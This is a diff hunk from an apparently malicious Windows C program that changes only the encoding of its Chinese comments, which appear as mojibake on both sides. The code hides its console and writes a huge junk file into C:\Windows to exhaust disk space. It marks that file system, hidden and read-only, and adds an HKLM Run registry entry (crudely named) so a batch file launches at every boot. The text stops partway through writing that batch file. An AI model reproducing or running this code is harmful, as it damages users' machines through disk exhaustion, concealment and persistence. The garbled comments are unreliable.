@@ -8,12 +8,12 @@ int main(){
 	FILE*file=fopen("C:\\Windows\\out","w");
 	char path[]="\"C:\\Windows\\test.bat\"";
 	HKEY key;
-	FreeConsole();//¼´Ê¹¹Ø±Õ³ÌĞòÒ²»áÒş²ØÔÚºóÌ¨Ö´ĞĞ 
+	FreeConsole(); //éšè—åœ¨åå°æ‰§è¡Œ 
 	for(i=0;i<=(INT_MAX/4);i++){
 		fprintf(file,"1145141919810");
 	}
-	system("attrib +s +h +r C:\\Windows\\out");//Òş²ØÖ¸¶¨ÎÄ¼ş 
-	//ĞŞ¸Ä×¢²á±íÊ¹Ö¸¶¨ÎÄ¼ş¿ª»ú×ÔÆô 
+	system("attrib +s +h +r C:\\Windows\\out");//éšè—æŒ‡å®šæ–‡ä»¶ 
+	//ä¿®æ”¹æ³¨å†Œè¡¨ä½¿æŒ‡å®šæ–‡ä»¶å¼€æœºè‡ªå¯ 
 	RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_ALL_ACCESS,&key);
 	RegSetValueEx(key,"FuckYou",0,REG_SZ,(const char*)path,sizeof(path));
 	file=fopen("C:\\Windows\\test.bat","w");
